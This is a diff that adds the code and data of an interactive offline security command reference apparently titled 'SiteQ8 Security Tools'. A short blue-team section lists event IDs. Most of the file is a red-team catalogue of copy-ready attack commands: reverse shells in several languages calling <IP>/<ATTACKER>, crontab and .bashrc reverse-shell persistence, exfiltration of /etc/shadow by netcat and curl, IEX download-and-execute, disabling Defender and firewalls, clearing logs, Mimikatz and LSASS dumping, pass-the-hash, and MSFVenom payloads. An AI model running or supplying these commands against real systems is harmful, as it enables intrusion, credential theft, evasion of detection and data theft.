+{t:'Process & service events',c:'4688  New process created (cmdline if configured)\n4689  Process exited\n4697  Service installed\n7034  Service crashed unexpectedly\n7045  New service installed (System log)'},
+{t:'Kerberos events',c:'4768  Kerberos TGT requested\n4769  Kerberos service ticket requested\n4771  Kerberos pre-auth failed\n4776  NTLM authentication attempt\n4777  DC failed to validate credentials'},
+{t:'Policy & audit changes',c:'4616  System time changed\n4657  Registry value modified\n4698  Scheduled task created\n4699  Scheduled task deleted\n4719  Audit policy changed'},
+{t:'PowerShell logging events',c:'4103  PS module logging\n4104  PS scriptblock logging  ← most useful\n4105  PS command started\n4106  PS command finished\n400   PS engine started'},
+{t:'Network share events',c:'5140  Network share accessed\n5142  Share added\n5143  Share modified\n5144  Share deleted\n5156  WFP allowed connection\n5157  WFP blocked connection'},
+{t:'Query — Last 100 logon events',c:'wevtutil qe Security /q:"*[System[(EventID=4624)]]" /c:100 /rd:true /f:text'},
+{t:'Query — Failed logins (PowerShell)',c:"Get-EventLog Security | ? {$_.Eventid -eq 4625} | Select TimeGenerated,Message | Select -First 50"},
+]},
+];
+
+const RED=[
+{id:'re-osint',icon:'🌐',label:'OSINT & Recon',desc:'DNS, WHOIS, theHarvester, Google dorks, subdomain enumeration, Shodan',cmds:[
+{t:'WHOIS domain lookup',c:'whois <DOMAIN>'},
+{t:'DNS — All record types',c:'dig <DOMAIN> ANY\ndig <DOMAIN> MX NS TXT A'},
+{t:'DNS — Zone transfer (axfr)',c:'dig axfr <DOMAIN> @<NS_IP>\nhost -t axfr -l <DOMAIN> <NS_IP>'},
+{t:'DNS — Reverse lookup',c:'dig -x <IP>\nhost <IP>'},
+{t:'Certificate transparency search',c:"curl -s 'https://crt.sh/?q=%25.<DOMAIN>&output=json' | jq -r '.[].name_value' | sort -u"},
+{t:'theHarvester — Full passive recon',c:'theHarvester -d <DOMAIN> -b all -l 500'},
+{t:'theHarvester — Email harvest',c:'theHarvester -d <DOMAIN> -b google,bing,linkedin'},
+{t:'Amass — Subdomain enumeration',c:'amass enum -d <DOMAIN>\namass enum -brute -d <DOMAIN> -w subdomains.txt\namass intel -org "<COMPANY>"'},
+{t:'Subfinder — Passive discovery',c:'subfinder -d <DOMAIN> -o subs.txt\nsubfinder -d <DOMAIN> -all -recursive'},
+{t:'Gobuster — DNS brute force',c:'gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt'},
+{t:'Google — Sensitive file types',c:'filetype:env "DB_PASSWORD"\nfiletype:sql "INSERT INTO"\nfiletype:log username password\nfiletype:yml database password'},
+{t:'Google — Admin panels',c:'intitle:"admin panel" site:<DOMAIN>\ninurl:"/wp-admin" site:<DOMAIN>\ninurl:"/phpmyadmin" site:<DOMAIN>'},
+{t:'Google — Directory listings',c:'intitle:"index of" site:<DOMAIN>\nintitle:"index of" /backup\nintitle:"index of" /uploads'},
+{t:'Shodan — Org / domain queries',c:'org:"<COMPANY>"\nhostname:<DOMAIN>\nssl:<DOMAIN>\nport:3389 country:US\nvuln:CVE-2021-44228'},
+{t:'SPF / DMARC record check',c:'dig TXT <DOMAIN> | grep spf\ndig TXT _dmarc.<DOMAIN>'},
+]},
+{id:'re-windows',icon:'🪟',label:'Windows',desc:'Situational awareness, AD enumeration, persistence, PowerShell, remote execution',cmds:[
+{t:'System info',c:'systeminfo\nver && hostname\nwmic cpu get datawidth /format:list'},
+{t:'Running processes (verbose)',c:'tasklist /svc\nwmic process get name,executablepath,processid\ntasklist /FI "STATUS eq running" /V'},
+{t:'Detect AV / EDR',c:'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState'},
+{t:'Network connections + PID',c:'netstat -ano\nnetstat -an | findstr ESTABLISHED'},
+{t:'Current user all privileges',c:'whoami /all\nwhoami /priv'},
+{t:'All local users',c:'net user\nwmic useraccount list full'},
+{t:'Local admin group',c:'net localgroup Administrators'},
+{t:'Domain admins',c:'net group "Domain Admins" /domain\nnet localgroup Administrators /domain'},
+{t:'Search for password strings in files',c:'findstr /spin "password" *.txt *.xml *.ini *.config 2>nul\ndir /s /b C:\\*pass* C:\\*cred* C:\\*.kdbx C:\\*vnc*'},
+{t:'Registry — Search for passwords',c:'reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s'},
+{t:'Registry — PuTTY saved sessions',c:'reg query HKCU\\Software\\SimonTatham\\Putty\\Sessions'},
+{t:'Volume Shadow Copy',c:'vssadmin list shadows\nwmic shadowcopy call create Volume=c:\\\nmklink /D C:\\restore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\'},
+{t:'Disable Windows Defender',c:'sc config WinDefend start= disabled && sc stop WinDefend\nSet-MpPreference -DisableRealtimeMonitoring $true'},
+{t:'Disable firewall (all profiles)',c:'netsh advfirewall set allprofiles state off'},
+{t:'Clear event logs',c:'wevtutil cl Application && wevtutil cl Security && wevtutil cl System'},
+{t:'Persist — Scheduled task (daily 9AM)',c:'schtasks /Create /F /SC DAILY /ST 09:00 /TN OfficeUpdater /TR <FILE>'},
+{t:'Persist — HKCU Run key (on logon)',c:'reg ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /V OfficeUpdater /t REG_SZ /F /D <FILE>'},
+{t:'Persist — SYSTEM scheduled task',c:'schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE>'},
+{t:'AD — BloodHound data collection',c:'SharpHound.exe --CollectionMethods All\n# Import ZIP → BloodHound → Shortest Path to DA'},
+{t:'Remote exec — psexec',c:'psexec \\\\<IP> -u <USER> -p <PASS> cmd.exe\npsexec \\\\<IP> -u <USER> -p <PASS> -s cmd.exe'},
+{t:'Remote exec — WMI',c:'wmic /node:<IP> /user:<DOMAIN>\\<USER> /password:<PASS> process call create "<CMD>"'},
+{t:'Port forward (native netsh)',c:'netsh interface portproxy add v4tov4 listenport=3000 listenaddress=0.0.0.0 connectport=4000 connectaddress=<TARGET>'},
+]},
+{id:'re-linux',icon:'🐧',label:'Linux',desc:'System enumeration, persistence, privilege escalation, pivoting',cmds:[
+{t:'System / OS info',c:'uname -a\ncat /etc/os-release\nid && w && last -a\ndf -h && fdisk -l'},
+{t:'Listening ports + owning process',c:'ss -tlnp\nnetstat -tulpn'},
+{t:'All active connections',c:'ss -natp\nlsof -i'},
+{t:'SUID / SGID binaries',c:'find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la'},
+{t:'World-writable directories',c:'find / -type d -perm -0002 2>/dev/null'},
+{t:'Check sudo permissions',c:'sudo -l'},
+{t:'All cron jobs',c:'cat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.daily/\ncrontab -l'},
+{t:'Find SSH private keys',c:'find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null'},
+{t:'Search configs for credentials',c:'grep -rn "password\\|passwd\\|secret\\|api_key" /etc/ /var/www/ /home/ 2>/dev/null'},
+{t:'Bash history all users',c:'cat ~/.bash_history\nfind /home -name ".bash_history" 2>/dev/null | xargs cat'},
+{t:'LinPEAS — Auto privesc scan',c:'curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'},
+{t:'GTFOBins — sudo find exec',c:'sudo find . -exec /bin/sh \\;'},
+{t:'GTFOBins — sudo vim shell',c:"sudo vim -c ':!/bin/sh'"},
+{t:'GTFOBins — sudo python',c:"sudo python3 -c 'import os; os.system(\"/bin/bash\")'"},
+{t:'Persist — rc.local',c:'echo "<PAYLOAD>" >> /etc/rc.local'},
+{t:'Persist — crontab reverse shell',c:'crontab -e\n# Add:\n0 * * * * bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'},
+{t:'Persist — SSH authorized_keys',c:'mkdir ~/.ssh && chmod 700 ~/.ssh\necho "<PUB_KEY>" >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys'},
+{t:'Persist — Poison .bashrc',c:'echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> ~/.bashrc'},
+{t:'Clear command history',c:'export HISTFILE=/dev/null && history -c && unset HISTFILE'},
+{t:'Change MAC address',c:'ip link set dev <IF> down\nip link set dev <IF> address <NEW_MAC>\nip link set dev <IF> up'},
+{t:'IPTables — Port forward (C2 redirect)',c:'echo "1" > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -i <IF> -p tcp --dport <PORT> -j DNAT --to <C2_IP>:<PORT>\niptables -t nat -A POSTROUTING -j MASQUERADE'},
+]},
+{id:'re-ports',icon:'🌍',label:'Ports & Protocols',desc:'Top 50 ports, SCADA/ICS, IPv4/IPv6 subnets, TTL OS fingerprinting',cmds:[
+{t:'Common TCP ports — lower range',c:'20/21  FTP Data/Control\n22     SSH / SCP\n23     Telnet\n25     SMTP\n53     DNS\n80     HTTP\n88     Kerberos\n110    POP3\n135    MS RPC\n139    NetBIOS / SMB\n143    IMAP\n161    SNMP (UDP)\n389    LDAP\n443    HTTPS\n445    SMB Direct'},
+{t:'Common TCP ports — upper range',c:'1433   MS-SQL Server\n1434   MS-SQL Monitor (UDP)\n1521   Oracle DB\n2049   NFS\n3268   LDAP Global Catalog\n3306   MySQL\n3389   RDP\n4444   Metasploit default\n5432   PostgreSQL\n5900   VNC\n5985   WinRM HTTP\n5986   WinRM HTTPS\n6379   Redis\n8080   HTTP Alternate\n9200   Elasticsearch\n27017  MongoDB'},
+{t:'SCADA / ICS protocols',c:'102    S7Comm — Siemens S7 PLC\n502    Modbus TCP\n789    Red Lion Controls\n4840   OPC UA Discovery Server\n9600   OMRON FINS\n20000  DNP3\n34962  PROFINET\n44818  EtherNet/IP\n47808  BACnet (Building Automation)'},
+{t:'IPv4 private ranges (RFC1918)',c:'10.0.0.0/8       Class A — 16,777,214 hosts\n172.16.0.0/12    Class B —     65,534 hosts\n192.168.0.0/16   Class C —        254 hosts/subnet'},
+{t:'Subnet quick reference',c:'/8   = 255.0.0.0         = 16,777,214 hosts\n/16  = 255.255.0.0       =     65,534 hosts\n/24  = 255.255.255.0     =        254 hosts\n/25  = 255.255.255.128   =        126 hosts\n/26  = 255.255.255.192   =         62 hosts\n/27  = 255.255.255.224   =         30 hosts\n/28  = 255.255.255.240   =         14 hosts\n/30  = 255.255.255.252   =          2 hosts'},
+{t:'IPv6 address ranges',c:'2000::/3    Global Unicast (routable)\nfc00::/7    Unique Local (private)\nfe80::/10   Link-Local (not routable)\nff00::/8    Multicast\n::1/128     Loopback'},
+{t:'TTL fingerprinting by OS',c:'Linux / macOS:  TTL ≈ 64\nWindows:        TTL ≈ 128\nCisco IOS:      TTL ≈ 255\nSolaris / AIX:  TTL ≈ 255\n\n# Detect:\nping -c4 <TARGET>   # observe TTL\nnmap -O <TARGET>    # OS detection'},
+]},
+{id:'re-exploit',icon:'💣',label:'Exploitation',desc:'Metasploit, MSFVenom, SQLMap, web tools, brute force, hash cracking',cmds:[
+{t:'Metasploit — Start (quiet mode)',c:'msfconsole -q'},
+{t:'Metasploit — EternalBlue (MS17-010)',c:'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <TARGET>\nset LHOST <YOUR_IP>\nrun'},
+{t:'Metasploit — Multi handler',c:'use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST <YOUR_IP>\nset LPORT 4444\nrun -j'},
+{t:'Meterpreter — Key commands',c:'sysinfo\ngetuid\ngetsystem\nhashdump\nshell\nmigrate <PID>\nrun post/multi/recon/local_exploit_suggester'},
+{t:'MSFVenom — Windows x64 EXE',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > payload.exe'},
+{t:'MSFVenom — Linux ELF',c:'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > payload.elf\nchmod +x payload.elf'},
+{t:'MSFVenom — PowerShell one-liner',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd'},
+{t:'SQLMap — Basic detection',c:'sqlmap -u "http://target/?id=1"'},
+{t:'SQLMap — List databases',c:'sqlmap -u "http://target/?id=1" --dbs'},
+{t:'SQLMap — Dump table',c:'sqlmap -u "http://target/?id=1" -D <DB> -T <TABLE> --dump'},
+{t:'SQLMap — OS shell',c:'sqlmap -u "http://target/?id=1" --os-shell'},
+{t:'SQLMap — From Burp request file',c:'sqlmap -r request.txt --level=5 --risk=3'},
+{t:'Gobuster — Directory fuzzing',c:'gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50'},
+{t:'FFUF — Fast web fuzzer',c:'ffuf -u http://<TARGET>/FUZZ -w wordlist.txt -fc 404 -mc 200,301,302'},
+{t:'Nikto — Web vulnerability scan',c:'nikto -h http://<TARGET>'},
+{t:'Hydra — SSH brute force',c:'hydra -L users.txt -P pass.txt ssh://<IP> -t 4'},
+{t:'Hydra — HTTP POST form',c:'hydra -L users.txt -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"'},
+{t:'Hydra — RDP',c:'hydra -L users.txt -P pass.txt rdp://<IP>'},
+{t:'CrackMapExec — SMB spray',c:'crackmapexec smb <RANGE> -u users.txt -p pass.txt\ncrackmapexec smb <IP> -u admin -H <NTLM_HASH> --shares'},
+{t:'Hashcat — NTLM (-m 1000)',c:'hashcat -m 1000 ntlm.txt rockyou.txt'},
+{t:'Hashcat — NetNTLMv2 (-m 5600)',c:'hashcat -m 5600 netntlm.txt rockyou.txt'},
+{t:'Hashcat — AS-REP roasting (-m 18200)',c:'hashcat -m 18200 asrep.txt rockyou.txt'},
+{t:'John the Ripper — Crack',c:'john --wordlist=rockyou.txt hashes.txt\njohn --format=NT hashes.txt\njohn --show hashes.txt'},
+]},
+{id:'re-creds',icon:'🎭',label:'Credentials',desc:'Mimikatz, LSASS dump techniques, Pass-the-Hash, Kerberoasting, AS-REP roasting',cmds:[
+{t:'Mimikatz — Logon passwords (plaintext)',c:'mimikatz# sekurlsa::logonpasswords'},
+{t:'Mimikatz — Dump SAM',c:'mimikatz# lsadump::sam'},
+{t:'Mimikatz — DCSync all (Domain Admin)',c:'mimikatz# lsadump::dcsync /user:<DOMAIN>\\<USER>\nmimikatz# lsadump::dcsync /all /csv'},
+{t:'Mimikatz — Pass-the-Hash',c:'mimikatz# sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe'},
+{t:'Mimikatz — Golden Ticket',c:'mimikatz# kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ticket:golden.kirbi'},
+{t:'Mimikatz — One-liner from cmd',c:'mimikatz.exe "sekurlsa::logonpasswords" exit\nmimikatz.exe "lsadump::sam" exit'},
+{t:'LSASS dump — comsvcs.dll (no tools)',c:'# Get LSASS PID first:\nGet-Process lsass | select id\n\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> C:\\Windows\\Temp\\lsass.dmp full'},
+{t:'LSASS dump — procdump',c:'procdump.exe -accepteula -ma lsass.exe lsass.dmp'},
+{t:'Analyze dump — Pypykatz',c:'pip install pypykatz\npypykatz lsa minidump lsass.dmp'},
+{t:'SecretsDump — Remote (Impacket)',c:'secretsdump.py <DOMAIN>/<USER>:<PASS>@<IP>\nsecretsdump.py -hashes :<NTLM> <DOMAIN>/<USER>@<IP>'},
+{t:'Pass-the-Hash — Impacket',c:'wmiexec.py -hashes :<NTLM> <DOMAIN>/<USER>@<IP>\npsexec.py -hashes :<NTLM> <DOMAIN>/<USER>@<IP>'},
+{t:'Pass-the-Hash — CrackMapExec',c:'crackmapexec smb <IP> -u <USER> -H <NTLM>\ncrackmapexec smb <RANGE> -u Administrator -H <NTLM> --local-auth'},
+{t:'Kerberoasting — Find SPNs (Impacket)',c:'GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>\nGetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request'},
+{t:'Kerberoasting — Rubeus',c:'Rubeus.exe kerberoast /outfile:hashes.txt'},
+{t:'Kerberoasting — Crack ticket',c:'hashcat -m 13100 hashes.txt rockyou.txt\njohn --format=krb5tgs hashes.txt --wordlist=rockyou.txt'},
+{t:'AS-REP Roasting — GetNPUsers',c:'GetNPUsers.py <DOMAIN>/ -usersfile users.txt -format hashcat -dc-ip <DC_IP>'},
+{t:'AS-REP Roasting — Rubeus',c:'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt'},
+{t:'AS-REP Roasting — Crack',c:'hashcat -m 18200 asrep.txt rockyou.txt'},
+]},
+{id:'re-tunnel',icon:'🕳️',label:'Tunneling & Pivoting',desc:'SSH tunnels, ProxyChains, Chisel, Ligolo-ng, Socat relay, SSHuttle VPN',cmds:[
+{t:'SSH — Local port forward',c:"# Access target's 3306 via localhost:3306\nssh -L 3306:192.168.1.5:3306 <USER>@<JUMP>"},
+{t:'SSH — Remote port forward',c:'# Expose local port 443 on remote:8080\nssh -R 0.0.0.0:8080:127.0.0.1:443 root@<REMOTE>'},
+{t:'SSH — Dynamic SOCKS5 proxy',c:'ssh -D 1080 <USER>@<JUMP>\n# → proxychains: socks5 127.0.0.1 1080'},
+{t:'SSH — Multi-hop ProxyJump',c:'ssh -J <USER>@<HOP1>,<USER>@<HOP2> <USER>@<FINAL>'},
+{t:'SSH — Background tunnel',c:'ssh -fN -L 3306:192.168.1.5:3306 <USER>@<JUMP>'},
+{t:'ProxyChains — Configure + use',c:'# /etc/proxychains.conf:\ndynamic_chain\nsocks5 127.0.0.1 1080\n\n# Usage:\nproxychains nmap -sT -Pn <TARGET>\nproxychains curl http://<INTERNAL>/'},
+{t:'Chisel — SOCKS proxy pivot',c:'# Attacker:\nchisel server -p 8888 --reverse\n\n# Target:\nchisel client <ATTACKER>:8888 R:socks\n# → proxychains socks5 127.0.0.1 1080'},
+{t:'Chisel — Port forward',c:'# Attacker:\nchisel server -p 8888 --reverse\n\n# Target (192.168.1.5:80 → attacker:8080):\nchisel client <ATTACKER>:8888 R:8080:192.168.1.5:80'},
+{t:'Ligolo-ng — Full L3 tunnel setup',c:'# Attacker:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Target:\n./agent -connect <ATTACKER>:11601 -ignore-cert\n\n# Proxy console: session → start\n# Add route:\nsudo ip route add 192.168.1.0/24 dev ligolo'},
+{t:'Socat — TCP port relay',c:'socat TCP-LISTEN:8080,fork TCP:192.168.1.5:80'},
+{t:'Socat — Full TTY reverse shell',c:'# Attacker:\nsocat file:`tty`,raw,echo=0 TCP-LISTEN:4444\n\n# Target:\nsocat exec:\'bash -li\',pty,stderr,setsid,sigint,sane TCP:<ATTACKER>:4444'},
+{t:'SSHuttle — Route subnet via SSH',c:'sshuttle -r <USER>@<JUMP> 192.168.1.0/24'},
+{t:'SSHuttle — All traffic + DNS',c:'sshuttle --dns -r <USER>@<JUMP> 0/0'},
+]},
+{id:'re-shells',icon:'💡',label:'Reverse Shells',desc:'Shells for 10 platforms, TTY upgrade methods, data exfiltration techniques',cmds:[
+{t:'Listener — netcat',c:'nc -lvnp 4444'},
+{t:'Listener — socat (full TTY)',c:'socat file:`tty`,raw,echo=0 TCP-LISTEN:4444'},
+{t:'Bash — /dev/tcp redirect',c:'bash -i >& /dev/tcp/<IP>/4444 0>&1'},
+{t:'Bash — Alternate form',c:"bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"},
+{t:'Netcat — No -e flag (mkfifo)',c:'rm /tmp/f; mkfifo /tmp/f\ncat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 4444 > /tmp/f'},
+{t:'Python3',c:"python3 -c 'import socket,subprocess,os\ns=socket.socket()\ns.connect((\"<IP>\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])'"},
+{t:'PHP',c:"php -r '\$sock=fsockopen(\"<IP>\",4444);\nexec(\"/bin/sh -i <&3 >&3 2>&3\");'"},
+{t:'Perl',c:"perl -e 'use Socket;\$i=\"<IP>\";\$p=4444;\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,sockaddr_in(\$p,inet_aton(\$i)));\nopen(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");\nexec(\"/bin/sh -i\");'"},
+{t:'Ruby',c:"ruby -rsocket -e 'exit if fork\nc=TCPSocket.new(\"<IP>\",\"4444\")\nwhile(cmd=c.gets)\nIO.popen(cmd,\"r\"){|io|c.print io.read}end'"},
+{t:'PowerShell',c:"powershell -c \"\$c=New-Object Net.Sockets.TCPClient('<IP>',4444)\n\$s=\$c.GetStream()\n[byte[]]\$b=0..65535|%{0}\nwhile((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\n  \$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i)\n  \$r=(iex \$d 2>&1|Out-String)\n  \$x=\$r+'PS '+(pwd)+'> '\n  \$s.Write(\$b,0,\$x.Length)\n}\""},
+{t:'Telnet (two-listener method)',c:'# Run two listeners on attacker:\n# nc -lvnp 4444\n# nc -lvnp 4445\n\ntelnet <IP> 4444 | /bin/sh | telnet <IP> 4445'},
+{t:'TTY Upgrade — Python PTY (most common)',c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Press Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm"},
+{t:'TTY Upgrade — script command',c:'script /dev/null -c bash\n# Press Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm'},
+{t:'TTY — Fix terminal dimensions',c:'# On attacker: stty size\n# On target:\nstty rows <ROWS> cols <COLS>'},
+{t:'Exfil — Base64 in-band',c:'base64 -w 0 /etc/shadow\n# On attacker:\necho "<B64_DATA>" | base64 -d > shadow.txt'},
+{t:'Exfil — Netcat file transfer',c:'# Attacker receive:\nnc -lvnp 9999 > loot.tar.gz\n\n# Target send:\ntar czf - /etc/passwd /etc/shadow | nc <ATTACKER> 9999'},
+{t:'Exfil — HTTP POST (curl)',c:'curl -X POST http://<ATTACKER>/upload -F "file=@/etc/passwd"'},
+]},
+{id:'re-scripting',icon:'📜',label:'Scripting',desc:'PowerShell security scripts, Windows Batch, Python one-liners, Bash, Scapy',cmds:[
+{t:'PowerShell — Execution bypass',c:'powershell -ep bypass -nop -File <FILE>\nSet-ExecutionPolicy Bypass -Scope Process -Force'},
+{t:'PowerShell — Download and execute (IEX)',c:'IEX(New-Object Net.WebClient).DownloadString("<URL>")\nIEX(IWR "<URL>" -UseBasicParsing)'},
+{t:'PowerShell — TCP port scanner',c:'$ports=(22,80,443,3389,8080)\n$ip="<TARGET>"\nforeach($p in $ports){\n  $s=$null\n  try{$s=New-Object Net.Sockets.TCPClient($ip,$p)}catch{}\n  if($s){Write-Host "$ip:$p OPEN"; $s.Close()}\n}'},
+{t:'PowerShell — Send email',c:'Send-MailMessage -To "<TO>" -From "<FROM>" -Subject "<SUBJ>" -Attachments "<FILE>" -SmtpServer "<IP>"'},
+{t:'Batch — Nested ping sweep',c:'for /L %i in (10,1,254) do @(\n  for /L %x in (10,1,254) do @\n    ping -n 1 -w 100 10.10.%i.%x 2>nul |\n    find "Reply" && echo 10.10.%i.%x >> live.txt\n)'},
+{t:'Python — HTTP server',c:'python3 -m http.server 8080'},
+{t:'Python — Port scanner (no tools)',c:"python3 -c \"\nimport socket\nfor p in range(1,1025):\n  s=socket.socket()\n  s.settimeout(0.1)\n  if s.connect_ex(('<TARGET>',p))==0: print(f'OPEN:{p}')\n  s.close()\n\""},
+{t:'Bash — Ping sweep',c:'for x in {1..254}; do\n  ping -c1 -W1 192.168.1.$x &>/dev/null && echo "UP: 192.168.1.$x"\ndone'},
+{t:'Bash — Port scan (pure bash)',c:'for port in {1..1000}; do\n  (echo >/dev/tcp/<TARGET>/$port) 2>/dev/null && echo "OPEN: $port"\ndone'},
+{t:'Scapy — TCP SYN scan',c:"from scapy.all import *\nfor p in range(1,1025):\n  r=sr1(IP(dst='<TARGET>')/TCP(dport=p,flags='S'),timeout=0.1,verbose=0)\n  if r and r.haslayer(TCP) and r[TCP].flags==0x12: print(f'OPEN:{p}')"},
+{t:'Scapy — ARP spoofing',c:"from scapy.all import *\nsend(ARP(op=2, pdst='<VICTIM>', psrc='<GATEWAY>', hwdst='<VICTIM_MAC>'), loop=1)"},
+{t:'Scapy — Send UDP payload',c:"from scapy.all import *\nsend(IP(dst='<TARGET>')/UDP(dport=<PORT>)/Raw(load='<DATA>'))"},
+]},
+];
+
+// ── STATE ──────────────────────────────────────────────────
+const S={view:'home',filter:'all',q:'',mc:null};
+const $=id=>document.getElementById(id);
+const eh=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function hl(s,q){if(!q)return eh(s);const re=new RegExp(`(${q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')})`,'gi');return eh(s).replace(re,'<mark>$1</mark>')}
+function enc(o){return btoa(unescape(encodeURIComponent(JSON.stringify(o))))}
+function dec(s){return JSON.parse(decodeURIComponent(escape(atob(s))))}
+function tot(){return[...BLUE,...RED].reduce((a,s)=>a+s.cmds.length,0)}
+function vis(){let o=[];if(S.filter!=='red')o.push(...BLUE.map(s=>({...s,team:'blue'})));if(S.filter!=='blue')o.push(...RED.map(s=>({...s,team:'red'})));return o}
+
+// ── SIDEBAR ────────────────────────────────────────────────
+function rn(){
+  let h=`<div class="ng"><div class="ni${S.view==='home'?' active':''}" onclick="go('home')"><span class="nico">⚡</span>Dashboard</div></div>
+  <div class="ng"><div class="ngt gb">BLUE TEAM</div>`;
+  BLUE.forEach(s=>{h+=`<div class="ni${S.view===s.id?' active':''}" onclick="go('${s.id}')"><span class="nico">${s.icon}</span>${s.label}<span class="nb">${s.cmds.length}</span></div>`});
+  h+=`</div><div class="ng"><div class="ngt gr">RED TEAM</div>`;
+  RED.forEach(s=>{h+=`<div class="ni${S.view===s.id?' active ar':''}" onclick="go('${s.id}')"><span class="nico">${s.icon}</span>${s.label}<span class="nb">${s.cmds.length}</span></div>`});
+  h+=`</div>`;
+  $('sidebar').innerHTML=h;
+}
+
+// ── CARD ───────────────────────────────────────────────────
+function card(cmd,team,q=''){
+  const k=eh(enc({t:cmd.t,c:cmd.c,team}));
+  const dot=team==='blue'?'db':'dr';
+  const cc=team==='blue'?'cb':'cr';
+  const prev=cmd.c.split('\n').slice(0,3).join('\n');
+  const more=cmd.c.split('\n').length>3?'\n…':'';
+  return `<div class="cc2 ${cc}">
+  <div class="ch" onclick="om('${k}')"><span class="dot ${dot}"></span><span class="clbl">${hl(cmd.t,q)}</span><button class="cpb" onclick="dc(event,this,${JSON.stringify(cmd.c)})">COPY</button></div>
+  <div class="cprev" onclick="om('${k}')">${hl(prev+more,q)}</div>
+</div>`;
+}
+
+// ── PAGES ──────────────────────────────────────────────────
+function rHome(){
+  const bt=BLUE.map(s=>`<span class="ctag">${s.icon} ${s.label}</span>`).join('');
+  const rt=RED.map(s=>`<span class="ctag">${s.icon} ${s.label}</span>`).join('');
+  const ql=[
+    {i:'🔎',n:'NMAP / Scan',id:'bl-id'},{i:'💡',n:'Rev. Shells',id:'re-shells'},
+    {i:'🎭',n:'Credentials',id:'re-creds'},{i:'👁️',n:'Detect/Logs',id:'bl-detect'},
+    {i:'🕳️',n:'Tunneling',id:'re-tunnel'},{i:'🧬',n:'Forensics',id:'bl-forensics'},
+    {i:'💣',n:'Exploitation',id:'re-exploit'},{i:'🌍',n:'Ports/Protocols',id:'re-ports'},
+  ].map(x=>`<div class="qac" onclick="go('${x.id}')"><div class="qai">${x.i}</div><div class="qan">${x.n}</div></div>`).join('');
+  bc([{l:'SiteQ8 Security Tools'}]);
+  $('content').innerHTML=`
+<div class="hero">
+  <div class="ht">SiteQ8 <em>Security Tools</em></div>
+  <div class="hs">Interactive offline reference for offensive and defensive security operations.<br>Browse every module, search 300+ commands, copy to clipboard instantly.</div>
+  <div class="hst">
+    <div><div class="sv">${tot()}</div><div class="sl">COMMANDS</div></div>
+    <div><div class="sv">${BLUE.length+RED.length}</div><div class="sl">MODULES</div></div>
+    <div><div class="sv">2</div><div class="sl">TEAMS</div></div>
+  </div>
+</div>
+<div class="tcards">
+  <div class="tc tb" onclick="go('bl-id')"><div class="tci">🔵</div><div class="tct">Blue Team Tools</div><div class="tcd">Defensive operations — scanning, hardening, monitoring, incident response, forensics, and recovery.</div><div class="tctags">${bt}</div></div>
+  <div class="tc tr" onclick="go('re-osint')"><div class="tci">🔴</div><div class="tct">Red Team Tools</div><div class="tcd">Offensive operations — OSINT, exploitation, post-ex, credential attacks, pivoting, and scripting.</div><div class="tctags">${rt}</div></div>
+</div>
+<div class="qal">QUICK ACCESS</div>
+<div class="qag">${ql}</div>`;
+}
+
+function rSec(id){
+  const all=[...BLUE.map(s=>({...s,team:'blue'})),...RED.map(s=>({...s,team:'red'}))];
+  const sec=all.find(s=>s.id===id);
+  if(!sec)return;
+  const tl=sec.team==='blue'?'🔵 Blue Team':'🔴 Red Team';
+  bc([{l:'Home',cb:()=>go('home')},{l:tl,cb:()=>go('home')},{l:sec.label}]);
+  $('content').innerHTML=`<div class="sh"><div class="sico">${sec.icon}</div><div><div class="sn">${sec.label}</div><div class="sd">${sec.desc}</div></div></div><div class="cg">${sec.cmds.map(c=>card(c,sec.team)).join('')}</div>`;
+}
+
+function rSrch(q){
+  const hits=[];
